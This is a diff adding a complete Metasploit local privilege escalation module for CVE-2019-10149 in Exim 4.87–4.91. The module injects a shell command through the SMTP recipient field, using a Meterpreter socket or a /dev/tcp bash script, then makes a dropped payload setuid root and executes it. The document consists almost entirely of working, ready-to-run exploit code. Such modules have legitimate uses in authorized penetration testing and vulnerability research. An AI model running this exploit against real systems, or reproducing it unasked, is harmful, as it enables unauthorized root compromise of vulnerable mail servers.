@@ -1,0 +1,261 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'expect'
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FileDropper
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::System
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Exim 4.87 - 4.91 Local Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a flaw in Exim versions 4.87 to 4.91 (inclusive).
+        Improper validation of recipient address in deliver_message()
+        function in /src/deliver.c may lead to command execution with root privileges
+        (CVE-2019-10149).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Qualys', # Discovery and PoC (@qualys)
+          'Dennis Herrmann', # Working exploit (@dhn)
+          'Marco Ivaldi', # Working exploit (@0xdea)
+          'Guillaume André' # Metasploit module (@yaumn_)
+        ],
+      'DisclosureDate' => '2019-06-05',
+      'Platform'       => [ 'linux' ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        =>
+        [
+          [
+            'Exim 4.87 - 4.91',
+            lower_version: Gem::Version.new('4.87'),
+            upper_version: Gem::Version.new('4.91')
+          ]
+        ],
+      'DefaultOptions' =>
+        {
+          'PrependSetgid' => true,
+          'PrependSetuid' => true
+        },
+      'References'     =>
+        [
+          [ 'CVE', '2019-10149' ],
+          [ 'EDB', '46996' ],
+          [ 'URL', 'https://www.openwall.com/lists/oss-security/2019/06/06/1' ]
+        ]
+    ))
+
+    register_options(
+      [
+        OptInt.new('EXIMPORT', [ true, 'The port exim is listening to', 25 ])
+      ])
+
+    register_advanced_options(
+      [
+        OptBool.new('ForceExploit', [ false, 'Force exploit even if the current session is root', false ]),
+        OptFloat.new('SendExpectTimeout', [ true, 'Timeout per send/expect when communicating with exim', 3.5 ]),
+        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+      ])
+  end
+
+  def base_dir
+    datastore['WritableDir'].to_s
+  end
+
+  def encode_command(cmd)
+    '\x' + cmd.unpack('H2' * cmd.length).join('\x')
+  end
+
+  def open_tcp_connection
+    socket_subsystem = Rex::Post::Meterpreter::Extensions::Stdapi::Net::Socket.new(client)
+      params = Rex::Socket::Parameters.new({
+        'PeerHost' => '127.0.0.1',
+        'PeerPort' => datastore['EXIMPORT']
+      })
+      begin
+        socket = socket_subsystem.create_tcp_client_channel(params)
+      rescue => e
+        vprint_error("Couldn't connect to port #{datastore['EXIMPORT']}, "\
+                    "are you sure exim is listening on this port? (see EXIMPORT)")
+        raise e
+      end
+    return socket_subsystem, socket
+  end
+
+  def inject_payload(payload)
+    if session.type == 'meterpreter'
+      socket_subsystem, socket = open_tcp_connection
+
+      tcp_conversation = {
+        nil                                          => /220/,
+        'helo localhost'                             => /250/,
+        "MAIL FROM:<>"                               => /250/,
+        "RCPT TO:<${run{#{payload}}}@localhost>"     => /250/,
+        'DATA'                                       => /354/,
+        'Received:'                                  => nil,
+        '.'                                          => /250/
+      }
+
+      begin
+        tcp_conversation.each do |line, pattern|
+          Timeout.timeout(datastore['SendExpectTimeout']) do
+            if line
+              if line == 'Received:'
+                for i in (1..31)
+                  socket.puts("#{line} #{i}\n")
+                end
+              else
+                socket.puts("#{line}\n")
+              end
+            end
+            if pattern
+              socket.expect(pattern)
+            end
+          end
+        end
+      rescue Rex::ConnectionError => e
+        fail_with(Failure::Unreachable, e.message)
+      rescue Timeout::Error
+        fail_with(Failure::TimeoutExpired, 'SendExpectTimeout maxed out')
+      ensure
+        socket.puts("QUIT\n")
+        socket.close
+        socket_subsystem.shutdown
+      end
+    else
+      unless cmd_exec("/bin/bash -c 'exec 3<>/dev/tcp/localhost/#{datastore['EXIMPORT']}' "\
+                      "&& echo true").chomp.to_s == 'true'
+        fail_with(Failure::NotFound, "Port #{datastore['EXIMPORT']} is closed")
+      end
+
+      bash_script = %|
+        #!/bin/bash
+
+        exec 3<>/dev/tcp/localhost/#{datastore['EXIMPORT']}
+        read -u 3 && echo $REPLY
+        echo "helo localhost" >&3
+        read -u 3 && echo $REPLY
+        echo "mail from:<>" >&3
+        read -u 3 && echo $REPLY
+        echo 'rcpt to:<${run{#{payload}}}@localhost>' >&3
+        read -u 3 && echo $REPLY
+        echo "data" >&3
+        read -u 3 && echo $REPLY
+        for i in $(seq 1 30); do
+          echo 'Received: $i' >&3
+        done
+        echo "." >&3
+        read -u 3 && echo $REPLY
+        echo "quit" >&3
+        read -u 3 && echo $REPLY
+      |
+
+      @bash_script_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))
+      write_file(@bash_script_path, bash_script)
+      register_file_for_cleanup(@bash_script_path)
+      chmod(@bash_script_path)
+      cmd_exec("/bin/bash -c \"#{@bash_script_path}\"")
+    end
+
+    print_status('Payload sent, wait a few seconds...')
+    Rex.sleep(5)
+  end
+
+  def check_for_bash
+    unless command_exists?('/bin/bash')
+      fail_with(Failure::NotFound, 'bash not found')
+    end
+  end
+
+  def on_new_session(session)
+    super
+
+    if session.type == 'meterpreter'
+      session.core.use('stdapi') unless session.ext.aliases.include?('stdapi')
+      session.fs.file.rm(@payload_path)
+    else
+      session.shell_command_token("rm -f #{@payload_path}")
+    end
+  end
+
+  def check
+    if session.type == 'meterpreter'
+      begin
+        socket_subsystem, socket = open_tcp_connection
+      rescue
+        return CheckCode::Safe
+      end
+      res = socket.gets
+      socket.close
+      socket_subsystem.shutdown
+    else
+      check_for_bash
+      res = cmd_exec("/bin/bash -c 'exec 3</dev/tcp/localhost/#{datastore['EXIMPORT']} && "\
+                     "(read -u 3 && echo $REPLY) || echo false'")
+      if res == 'false'
+         vprint_error("Couldn't connect to port #{datastore['EXIMPORT']}, "\
+                      "are you sure exim is listening on this port? (see EXIMPORT)")
+         return CheckCode::Safe
+      end
+    end
+
+    if res =~ /Exim ([0-9\.]+)/i
+      version = Gem::Version.new($1)
+      vprint_status("Found exim version: #{version}")
+      if version >= target[:lower_version] && version <= target[:upper_version]
+        return CheckCode::Appears
+      else
+        return CheckCode::Safe
+      end
+    end
+
+    CheckCode::Unknown
+  end
+
+  def exploit
+    if is_root?
+      unless datastore['ForceExploit']
+        fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
+      end
+    end
+
+    unless writable?(base_dir)
+      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
+    end
+
+    if nosuid?(base_dir)
+      fail_with(Failure::BadConfig, "#{base_dir} is mounted nosuid")
+    end
+
+    unless datastore['PrependSetuid'] && datastore['PrependSetgid']
+      fail_with(Failure::BadConfig, 'PrependSetuid and PrependSetgid must both be set to true in order ' \
+                                    'to get root privileges.')
+    end
+
+    if session.type == 'shell'
+      check_for_bash
+    end
+
+    @payload_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))
+    write_file(@payload_path, payload.encoded_exe)
+    register_file_for_cleanup(@payload_path)
+    inject_payload(encode_command("/bin/sh -c 'chown root #{@payload_path};"\
+                                  "chmod 4755 #{@payload_path}'"))
+
+    unless setuid?(@payload_path)
+      fail_with(Failure::Unknown, "Couldn't escalate privileges")
+    end
+
+    cmd_exec("#{@payload_path} & echo ")
+  end
+end
